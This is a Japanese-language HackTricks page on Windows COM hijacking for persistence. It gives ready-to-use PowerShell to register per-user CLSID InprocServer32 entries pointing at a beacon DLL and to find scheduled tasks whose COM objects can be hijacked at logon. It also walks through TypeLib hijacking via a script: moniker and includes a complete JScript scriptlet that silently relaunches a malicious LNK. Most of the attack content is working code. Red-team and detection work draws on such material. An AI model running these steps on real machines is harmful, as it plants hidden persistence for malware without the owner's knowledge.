# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 存在しない COM コンポーネントの検索

HKCU の値はユーザーによって変更できるため、**COM Hijacking** は **永続化の手段** として利用できます。`procmon` を使えば、攻撃者が作成して永続化に利用できる、検索されるが存在しない COM レジストリを簡単に見つけられます。フィルタ:

- **RegOpenKey** 操作。
- その _Result_ が **NAME NOT FOUND** であるもの。
- そして _Path_ が **InprocServer32** で終わるもの。

代わりに偽装する存在しない COM を決めたら、次のコマンドを実行します。 _数秒ごとにロードされる COM を偽装することにすると過剰になり得るので注意してください._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### ハイジャック可能なタスク スケジューラ COM コンポーネント

Windows Tasks は Custom Triggers を使って COM オブジェクトを呼び出します。これらは Task Scheduler を通じて実行されるため、いつトリガーされるかを予測しやすくなります。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

出力を確認すると、例えば **ユーザーがログインするたびに** 実行されるものを選択できます。

次に CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** を **HKEY\CLASSES\ROOT\CLSID** および HKLM、HKCU で検索すると、通常その値は HKCU には存在しないことがわかります。
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
その後、HKCU エントリを作成するだけで、ユーザーがログインするたびに your backdoor が起動します。

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) は COM インターフェースを定義し、`LoadTypeLib()` を介してロードされます。COM サーバーがインスタンス化されると、OS は `HKCR\TypeLib\{LIBID}` 以下のレジストリキーを参照して関連する TypeLib をロードすることがあります。TypeLib のパスが **moniker**（例: `script:C:\...\evil.sct`）に置き換えられると、TypeLib が解決される際に Windows がそのスクリプトレットを実行します — これにより、一般的なコンポーネントが触れられたときに発動するステルスな永続化が得られます。

これは Microsoft Web Browser control に対して観測されており（頻繁に Internet Explorer、WebBrowser を埋め込むアプリ、そして `explorer.exe` によってロードされます）、悪用されています。

### Steps (PowerShell)

1) 頻度の高い CLSID が使用する TypeLib (LIBID) を特定する。例 CLSID often abused by malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser)。
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) ユーザーごとの TypeLib パスをローカルの scriptlet に `script:` モニカーで指定する（管理者権限は不要）:
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) 最小限の JScript `.sct` を配置して、primary payload を再起動させる（例: initial chain で使用される `.lnk`）:
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) トリガー – IE を開く、WebBrowser control を埋め込んだアプリケーションを起動する、あるいは通常の Explorer の操作を行うだけで TypeLib が読み込まれ scriptlet が実行され、logon/reboot 時にあなたの chain が再度有効化されます。

クリーンアップ
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
注意
- 同じロジックを他の使用頻度の高い COM コンポーネントにも適用できます。まず `HKCR\CLSID\{CLSID}\TypeLib` から実際の `LIBID` を解決してください。
- 64ビットシステムでは、64ビットの利用元向けに `win64` サブキーも設定できます。

## 参考資料

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
